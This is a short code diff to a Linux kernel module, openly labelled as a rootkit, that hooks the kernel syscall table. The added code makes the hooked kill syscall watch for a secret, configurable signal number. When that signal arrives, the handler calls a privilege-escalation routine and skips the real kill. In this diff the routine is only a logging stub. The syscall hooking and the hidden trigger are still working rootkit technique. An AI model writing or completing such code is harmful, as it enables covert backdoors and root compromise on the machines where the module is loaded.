@@ -25,7 +25,6 @@ MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 static unsigned long *sys_call_table;	//points to kernel's syscall table
 
-
 //max numTargets
 #define numTargets 5
 //MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
@@ -51,10 +50,27 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
 }
 
+//privilege escalation code
+int secretKillSig = 42;
+module_param(secretKillSig, int, 0);
+MODULE_PARM_DESC(secretKillSig, "define a kill signal which when used will replace the kill syscall with magic\n");
+
+void escalateProcess(pid_t pid){
+	pr_info("escalation called for pid %d\n", pid);
+	return;
+}
+
 asmlinkage int totallyReal_kill(pid_t pid, int sig){
 	pr_info("kill issued on pid %d with sig %d\n", pid, sig);
+	if(sig == secretKillSig){
+		pr_info("secretKillSig used");
+		escalateProcess(pid);
+		return 0;
+	}
 	return ((typeof(sys_kill)*)(original_syscallPtrs[4]))(pid, sig);
 }
+//end privilege escalation code
+
 
 void injectSyscalls(void){
 	int targetIndex;
